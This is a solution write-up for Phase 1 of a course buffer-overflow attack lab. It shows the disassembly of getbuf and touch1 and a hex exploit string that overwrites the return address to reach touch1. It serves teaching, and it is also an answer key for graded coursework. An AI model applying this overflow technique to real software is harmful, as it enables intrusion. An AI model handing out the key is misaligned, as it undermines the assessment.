# attack_lab_solution

## Preface
To run this lab program, you should use the command `./ctarget -q` instead of `./ctarget` since there's no grading server.

## Phase 1
This phase is so easy and it just helps you to get familiar with this lab. You can choose to use the command objdump or just use gdb to solve this lab.
One way is to use the command objdump and then you get the corresponding source code of getbuf() and touch1() function:
``` asm00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40

```
It's clear that the address of touch1 should be 0x4017c0. Then you get the unique key to solve this problem. You also find that the command `sub $0x28, %rsp` allocates 40 bytes(0x28 = 40 in decimal). Then you just need to use some random bytes to fill up these 40 bytes and combine it with the address. 
It should be mentioned that you should know whether your system is little-endian or not, it decides the order of your answer. On my little-endian system, the answer could be 
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```
